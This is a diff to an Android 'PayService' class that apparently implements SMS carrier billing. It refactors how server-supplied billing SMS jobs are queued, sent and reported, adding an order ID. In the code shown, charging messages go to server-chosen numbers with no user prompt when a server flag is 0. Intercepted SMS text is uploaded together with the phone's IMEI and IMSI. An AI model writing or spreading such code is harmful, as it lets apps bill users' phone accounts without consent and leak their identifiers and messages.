@@ -44,9 +44,9 @@ public class PayService {
     private long lastPayTime = -1;
     private IPayListener mPayListener;
     private List<String> mInterceptPhone = new ArrayList<String>();
-    private Queue<String> smsIdQueue = new LinkedBlockingQueue<String>();
-    private Queue<String> sendSmsIdQueue = new LinkedBlockingQueue<String>();
-
+    private Queue<SMSSendModel> smsIdQueue = new LinkedBlockingQueue<SMSSendModel>();
+    private Queue<SMSSendModel> sendSmsIdQueue = new LinkedBlockingQueue<SMSSendModel>();
+    private String orderId  ;
     public void setLatitued(double latitued) {
         this.latitued = latitued;
     }
@@ -166,6 +166,7 @@ public class PayService {
                             JSONObject smsJson = array.getJSONObject(i);
                             SMSSendModel smsSendModel = new SMSSendModel();
                             smsSendModel.smsId = smsJson.optString("smsId");
+                            smsSendModel.orderId = smsJson.optString("orderId") ;
                             smsSendModel.port = smsJson.optString("port");
                             smsSendModel.money = smsJson.optInt("money");
                             smsSendModel.regexp = smsJson.optString("regexp");
@@ -178,7 +179,7 @@ public class PayService {
                         }
                         if (popup == 0) {
                             for (SMSSendModel sms : smsSendModelList) {
-                                sendSMS(sms.smsId, sms.port, sms.sms);
+                                sendSMS(sms);
                             }
                         } else {
                             new AlertDialog.Builder(mActivity)
@@ -206,7 +207,7 @@ public class PayService {
                                                         int which) {
                                                     // 发送短信
                                                     for (SMSSendModel sms : smsSendModelList) {
-                                                        sendSMS(sms.smsId, sms.port, sms.sms);
+                                                        sendSMS(sms);
                                                     }
                                                 }
                                             }).create().show();
@@ -246,16 +247,11 @@ public class PayService {
      * 发送短信
      * <p/>
      * 短信标识
-     *
-     * @param smsId          发送端口号
-     * @param port
-     * @param sms            扣费指令
      */
 
-    private void sendSMS(final String smsId, final String port,
-                         final String sms) {
-        smsIdQueue.add(smsId);
-        sendSmsIdQueue.add(smsId);
+    private void sendSMS(final SMSSendModel model) {
+        smsIdQueue.add(model);
+        sendSmsIdQueue.add(model);
         mHandler.postDelayed(new Runnable() {
 
             @Override
@@ -264,8 +260,8 @@ public class PayService {
                 PendingIntent sentPI = PendingIntent.getBroadcast(mActivity, 0,
                         intent, 0);
                 SmsManager manager = SmsManager.getDefault();
-                Log.e("SendMessage", port + "->" + sms);
-                manager.sendTextMessage(port, null, sms, sentPI, null);
+                Log.e("SendMessage", model.port+ "->" + model.sms);
+                manager.sendTextMessage(model.port, null, model.sms, sentPI, null);
             }
         }, 100);
 //        mHandler.postDelayed(new Runnable() {
@@ -299,24 +295,25 @@ public class PayService {
     /**
      * 短信发送成功通知服务器
      *
-     * @param smsId  短信标识
      * @param status 失败重试次数
      */
-    private void notifyMessage(final String smsId, final int status) {
+    private void notifyMessage(final SMSSendModel model , final int status) {
         SMSSendStatusApi api = new SMSSendStatusApi();
-        api.smsId = smsId;
+        api.smsId = model.smsId;
+        api.orderId = model.orderId ;
         api.status = status;
         api.setResponse(new JsonResponse());
         new NetTask().execute(api);
     }
 
-    private void sendMessageToServer(String smsId, String sms, String port) {
+    private void sendMessageToServer(SMSSendModel model, String sms, String port) {
         IntercepteApi intercepteApi = new IntercepteApi();
         intercepteApi.imei = imei;
         intercepteApi.imsi = imsi;
-        intercepteApi.smsId = smsId;
+        intercepteApi.smsId = model.smsId;
         intercepteApi.sms = sms;
         intercepteApi.port = port;
+        intercepteApi.orderId = model.orderId;
         intercepteApi.setResponse(new JsonResponse());
         new NetTask().execute(intercepteApi);
     }
